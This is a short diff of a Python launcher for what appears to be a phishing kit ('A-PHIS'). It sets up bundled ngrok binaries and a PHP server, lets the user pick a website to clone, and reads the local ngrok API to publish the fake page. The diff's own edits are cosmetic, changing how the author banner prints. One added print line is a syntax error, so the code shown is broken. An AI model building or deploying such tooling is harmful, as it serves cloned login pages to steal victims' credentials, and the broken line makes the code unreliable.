@@ -3,7 +3,7 @@ os.system("pkg install ruby")
 os.system("gem install lolcat")
 blue= '\33[94m'
 lightblue = '\033[94m'
-a="                  "+lightblue+"Author: ABIR HOSSAIN"
+
 red = '\033[91m'
 white = '\33[97m'
 yellow = '\33[93m'
@@ -13,6 +13,7 @@ end = '\033[0m'
 os.system("chmod +x Abir/ngrok*")
 os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
 os.system("killall php> /dev/null 2>&1")
+os.system("clear")
 os.system("lolcat A-PHIS.py")
 def setup_site(website):
 	os.system("clear")
@@ -61,7 +62,7 @@ else:
 setup_site(website)
 os.system("clear")
 os.system("lolcat phislogo.py")
-print(a)
+print("Author:ABIR HOSSAIN")
 print()
 print(""+green+"plz wait  few seconde and  on your hotspot else its well not work")
 print()
@@ -94,7 +95,7 @@ time.sleep(1)
 print()
 os.system("clear")
 os.system("lolcat phislogo.py")
-print(a)
+print(Author:ABIRBHOSSAIN")
 print()
 os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
 with open('tunnels.json') as data_file:    
